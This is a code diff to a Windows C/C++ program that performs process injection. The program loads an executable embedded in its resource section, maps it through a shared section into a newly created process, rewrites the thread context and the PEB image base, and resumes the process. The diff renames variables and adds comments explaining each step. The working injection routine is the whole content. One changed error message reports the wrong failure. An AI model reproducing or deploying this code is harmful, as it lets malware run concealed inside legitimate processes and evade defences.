@@ -9,18 +9,20 @@ int main()
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	PROCESS_BASIC_INFORMATION pbi;
-	PULONG returnLen = NULL;
+
+	const int baseAddrLength = 4;
+	const int pebImageBaseAddrOffset = 8;
 
 	ZeroMemory(&si, sizeof(si));
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
 
-	HINSTANCE handleToRemoteNtDll = LoadLibrary("ntdll");
+	HINSTANCE handleNtDll = LoadLibrary("ntdll");
 
-	FARPROC fpNtQueryInformationProcess = GetProcAddress(handleToRemoteNtDll, "NtQueryInformationProcess");
-	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleToRemoteNtDll, "ZwUnmapViewOfSection");
-	FARPROC fpZwCreateSection = GetProcAddress(handleToRemoteNtDll, "ZwCreateSection");
-	FARPROC fpZwMapViewOfSection = GetProcAddress(handleToRemoteNtDll, "ZwMapViewOfSection");
+	FARPROC fpNtQueryInformationProcess = GetProcAddress(handleNtDll, "NtQueryInformationProcess");
+	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleNtDll, "ZwUnmapViewOfSection");
+	FARPROC fpZwCreateSection = GetProcAddress(handleNtDll, "ZwCreateSection");
+	FARPROC fpZwMapViewOfSection = GetProcAddress(handleNtDll, "ZwMapViewOfSection");
 
 	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;
 	_ZwUnmapViewOfSection ZwUnmapViewOfSection = (_ZwUnmapViewOfSection)fpZwUnmapViewOfSection;
@@ -33,157 +35,108 @@ int main()
 	}
 
 
+	/* Retrieves ProcessBasicInformaton info from the created process */
+	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
 
-	NtQueryInformationProcess(
-		pi.hProcess,
-		ProcessBasicInformation,
-		&pbi,
-		sizeof(pbi),
-		returnLen
-	);
-
-	// GET PEB Info
+	/* Retrieves PEB info of the created process */
 	PPEB peb = new PEB();
 	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, peb, sizeof(PEB), 0);
 
-	/* Resource Test */
+	/* Find and load exe stored in the PE's resource section */
 	HRSRC resc = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
 	HGLOBAL rescData = LoadResource(NULL, resc);
+
+	/* Get pointer to the resource base address */
 	LPVOID lpmyExe = LockResource(rescData);
 
 
-	PIMAGE_DOS_HEADER dosHeaderYo = (PIMAGE_DOS_HEADER)lpmyExe;
+	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpmyExe;
 
-	if (dosHeaderYo->e_magic != IMAGE_DOS_SIGNATURE)
+	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
 	{
 		printf("Failed: .exe does not have a valid signature %i", GetLastError());
 	}
 
-	PIMAGE_NT_HEADERS pNTHeaderYo = (PIMAGE_NT_HEADERS)((DWORD)dosHeaderYo + (DWORD)dosHeaderYo->e_lfanew);
-
+	PIMAGE_NT_HEADERS pNTHeaderResource = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + (DWORD)pDosHeader->e_lfanew);
 
 	HANDLE secHandle = NULL;
 
-	LARGE_INTEGER pLarge;
-	pLarge.QuadPart = pNTHeaderYo->OptionalHeader.SizeOfImage;
+	LARGE_INTEGER pLargeInt;
+	pLargeInt.QuadPart = pNTHeaderResource->OptionalHeader.SizeOfImage;
 
-	NTSTATUS s = ZwCreateSection(
-		&secHandle,
-		SECTION_ALL_ACCESS,
-		NULL,
-		&pLarge,
-		PAGE_EXECUTE_READWRITE,
-		SEC_COMMIT,
-		NULL
-	);
-	printf("Process id: %i\n", GetCurrentProcessId());
-	printf("Created Process id: %i\n", pi.dwProcessId);
+	SIZE_T commitSize = pNTHeaderResource->OptionalHeader.SizeOfImage;
+	SIZE_T viewSizeThisProcess = 0;
+	SIZE_T viewSizeCreatedPrcess = 0;
 
-	SIZE_T commitSize = pNTHeaderYo->OptionalHeader.SizeOfImage;
-	SIZE_T viewSize = 0;
-	SIZE_T viewSize2 = 0;
-	PVOID sectionBaseAddress = NULL;
-	PVOID sectionBaseAddress2 = NULL;
+	PVOID sectionBaseAddressThisProcess = NULL;
+	PVOID sectionBaseAddressCreatedProcess = NULL;
 
-	s = ZwMapViewOfSection(
-		secHandle,
-		GetCurrentProcess(),
-		&sectionBaseAddress,
-		NULL,
-		NULL,
-		NULL,
-		&viewSize,
-		ViewUnmap,
-		NULL,
-		PAGE_EXECUTE_READWRITE
-	);
+	/* Create the section object which will be shared by both the current and created process */
+	ZwCreateSection(&secHandle, SECTION_ALL_ACCESS, NULL, &pLargeInt, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+
+	/* Map the created section into the current process's virtual address space */
+	ZwMapViewOfSection(secHandle, GetCurrentProcess(), &sectionBaseAddressThisProcess, NULL, NULL, NULL, &viewSizeThisProcess, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
 	
-	s = ZwMapViewOfSection(
-		secHandle,
-		pi.hProcess,
-		&sectionBaseAddress2,
-		NULL,
-		NULL,
-		NULL,
-		&viewSize2,
-		ViewUnmap,
-		NULL,
-		PAGE_EXECUTE_READWRITE
-	);
+	/* Map the created section into the created process's virtual address space */
+	ZwMapViewOfSection(secHandle, pi.hProcess, &sectionBaseAddressCreatedProcess, NULL, NULL, NULL, &viewSizeCreatedPrcess, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE);
 
-	BYTE* headerBuffer = new BYTE[pNTHeaderYo->OptionalHeader.SizeOfHeaders];
+	PBYTE pHeader = new BYTE[pNTHeaderResource->OptionalHeader.SizeOfHeaders];
 
-	memcpy(headerBuffer, dosHeaderYo, pNTHeaderYo->OptionalHeader.SizeOfHeaders);
+	memcpy(pHeader, pDosHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders);
 
-	
-	if (!WriteProcessMemory(GetCurrentProcess(), sectionBaseAddress, headerBuffer, pNTHeaderYo->OptionalHeader.SizeOfHeaders, NULL))
+	/* Copy the headers of the process that is to be injected into the created process */
+	if (!WriteProcessMemory(GetCurrentProcess(), sectionBaseAddressThisProcess, pHeader, pNTHeaderResource->OptionalHeader.SizeOfHeaders, NULL))
 	{
-		printf("Failed: Unable to write headers: %i", GetLastError());
+		printf("Failed: .exe does not have a valid DOS signature %i", GetLastError());
 		return -1;
 	}
 	
+	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNTHeaderResource);
 
-	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(pNTHeaderYo);
-
-	for (int i = 0; i < pNTHeaderYo->FileHeader.NumberOfSections; i++)
+	/* Copy the sections of the process that is to be injected into the created process */
+	for (int i = 0; i < pNTHeaderResource->FileHeader.NumberOfSections; i++)
 	{
-		BYTE* section = new BYTE[(DWORD)sectionHeader->SizeOfRawData];
-		memcpy(section, (PVOID)((DWORD)dosHeaderYo + (DWORD)sectionHeader->PointerToRawData), (DWORD)sectionHeader->SizeOfRawData);
+		printf("Copying data from: %s\n", pSectionHeader->Name);
 
-		printf("Copying data from: %s\n", sectionHeader->Name);
+		PBYTE section = new BYTE[(DWORD)pSectionHeader->SizeOfRawData];
 
-		if (!WriteProcessMemory(GetCurrentProcess(), (LPVOID)((DWORD)sectionBaseAddress + (DWORD)sectionHeader->VirtualAddress), section, (DWORD)sectionHeader->SizeOfRawData, NULL))
+		memcpy(section, (PVOID)((DWORD)pDosHeader + (DWORD)pSectionHeader->PointerToRawData), (DWORD)pSectionHeader->SizeOfRawData);
+
+		if (!WriteProcessMemory(GetCurrentProcess(), (LPVOID)((DWORD)sectionBaseAddressThisProcess + (DWORD)pSectionHeader->VirtualAddress), section, (DWORD)pSectionHeader->SizeOfRawData, NULL))
 		{
-			printf("Failed: %i", GetLastError());
+			printf("Failed copying data from %s: %i", pSectionHeader->Name, GetLastError());
+
 			return -1;
 		}
-		sectionHeader++;
+		pSectionHeader++;
 	}
 
-	ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);
+	/* Unmap the shared section from the current process's virutal address space */
+	ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddressThisProcess);
 
+	/* Retrieve the suspended procceses current context */
 	PCONTEXT lpContext = new CONTEXT();
 	lpContext->ContextFlags = CONTEXT_FULL;
 	GetThreadContext(pi.hThread, lpContext);
-	lpContext->Eax = (DWORD)sectionBaseAddress2 + (DWORD)pNTHeaderYo->OptionalHeader.AddressOfEntryPoint;
 
+	/* Set the Orginal Entry Point (OEP) value */
+	lpContext->Eax = (DWORD)sectionBaseAddressCreatedProcess + (DWORD)pNTHeaderResource->OptionalHeader.AddressOfEntryPoint;
 
-	printf("EAX: %x\n", lpContext->Eax);
+	/* Set the suspended exe context with the updated eax value which points to the injected code */
+	SetThreadContext(pi.hThread, lpContext);
 
-	SetThreadContext(
-		pi.hThread,
-		lpContext
-	);
-
+	//DWORD  temp = (DWORD)sectionBaseAddressCreatedProcess;
+	//DWORD* pTemp = &temp;
 	
-	DWORD temp = (DWORD)sectionBaseAddress2;
-	DWORD* pTemp = &temp;
-	
+	/* Overwrite the PEB base address with the image base address of the injected exe */
+	WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pbi.PebBaseAddress + pebImageBaseAddrOffset), &sectionBaseAddressCreatedProcess, baseAddrLength, NULL);
 
-	printf("Created Process Image Base Address %x\n", peb->ImageBaseAddress);
-	WriteProcessMemory(
-		pi.hProcess,
-		(LPVOID)((DWORD)pbi.PebBaseAddress + 8),
-		pTemp,
-		4,
-		NULL
-	);
-	
-	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, peb, sizeof(PEB), 0);
-
-	printf("Created Process Image Base Address %x\n", sectionBaseAddress);
-
-
-	printf("Created Process id: %i\n", pi.dwProcessId);
-	ResumeThread(
-		pi.hThread
-	);
+	/* Resume the created processes main thread with the updated OEP */
+	ResumeThread(pi.hThread);
 	
 
-	printf("Size of Image: %u\n", pNTHeaderYo->OptionalHeader.SizeOfImage);
-	printf("Created Process PebBaseAddress: 0x%x\n", pbi.PebBaseAddress);
-	printf("Created Process Image Base Address %x\n", peb->ImageBaseAddress);
-	printf("Source Base Address %x\n", pNTHeaderYo->OptionalHeader.ImageBase);
+	printf("\nCreated Process id: %i\n", pi.dwProcessId);
+	printf("Injected process Image Base Address 0x%x\n", sectionBaseAddressCreatedProcess);
 
 	return 0;
 }
